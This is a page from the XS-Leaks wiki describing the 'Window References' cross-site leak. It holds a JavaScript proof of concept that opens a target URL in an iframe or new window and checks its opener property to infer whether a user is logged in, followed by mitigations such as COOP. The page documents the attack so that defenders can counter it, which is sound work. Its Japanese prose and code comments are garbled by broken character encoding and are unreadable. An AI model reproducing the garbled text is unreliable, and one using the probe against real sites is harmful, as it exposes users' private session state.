+++
title = "Window References"
description = ""
date = "2020-10-08"
category = [
    "Attack",
]
abuse = [
    "Window References",
]
defenses = [
    "Fetch Metadata",
    "SameSite Cookies",
    "COOP"
]
menu = "main"
weight = 2
+++

�����y�[�W�� `opener` �v���p�e�B�� `null` �ɐݒ肵����A���[�U�[�̏�Ԃɉ����� [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) �ɂ��ی���g���Ă���Ȃ�A���̏�ԂɊւ���N���X�T�C�g���𐄑��ł���B
�Ⴆ�΁A�U���҂͔F�؂��ꂽ���[�U�[�݂̂��A�N�Z�X�ł��� iframe (�܂��͐V�����E�B���h�E) �ŃG���h�|�C���g���J���A���̃E�B���h�E�̎Q�Ƃ��`�F�b�N���邾���ŁA���[�U�[�����O�C�����Ă��邩�ǂ��������o���邱�Ƃ��ł���B

## �R�[�h
�ȉ��̃R�[�h��p���邱�ƂŁA`open` �v���p�e�B�� `null` �ɐݒ肳��Ă��邩�A���邢�� [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) �w�b�_�[�� `unsafe-none` �ȊO�̒l�ő��݂��邩�ǂ��������o�ł���B
����́Aiframe�ƐV�����E�B���h�E�̗����ōs�����Ƃ��ł���B

```javascript
// �Ǝ�ȍU���Ώ�URL
const v_url = 'https://example.org/profile';

const exploit = (url, new_window) => {
  let win;
  if(new_window){
    // �V�����^�u���J���Awin.opener �� COOP �̉e�����󂯂����A���邢�� null �ɐݒ肳�ꂽ���ǂ������m�F
    win = open(url);
  }else{
    // opener ����`����Ă��邩�ǂ��������o���邽�߂� iframe ���쐬
    // COOP �̌��o��A�y�[�W���t���[���ی���������Ă���ꍇ�͋@�\���Ȃ�
    document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks">'); 
    // iframe��Ǝ�ȍU���Ώ�URL�Ƀ��_�C���N�g����
    win = open(url, "xsleaks");
  }
  
  // �y�[�W�̃��[�h��2�b�҂�
  setTimeout(() => {
    // �V�����J�����E�B���h�E�̃I�[�v�i�[�v���p�e�B���m�F����
    if(!win.opener) console.log("win.opener is null");
    else console.log("win.opener is defined");
  }, 2000);
}
exploit(v_url);
exploit(v_url, 1);

```

## �΍�

���̎�� XS-Leak ���y��������@�́ACOOP ���g���Ă��ׂẴy�[�W�� `opener` �v���p�e�B�𓯂��l�ɐݒ肵�A�قȂ�y�[�W�Ԃň�ѐ����������邱�Ƃł���B
JavaScript ���g���� `opener` �� `null` �ɐݒ肷��ƁAiframe �̃T���h�{�b�N�X�������g���� JavaScript �����S�ɖ����ɂ��邱�Ƃ��ł��邽�߁A�G�b�W�P�[�X���������邱�Ƃ�����B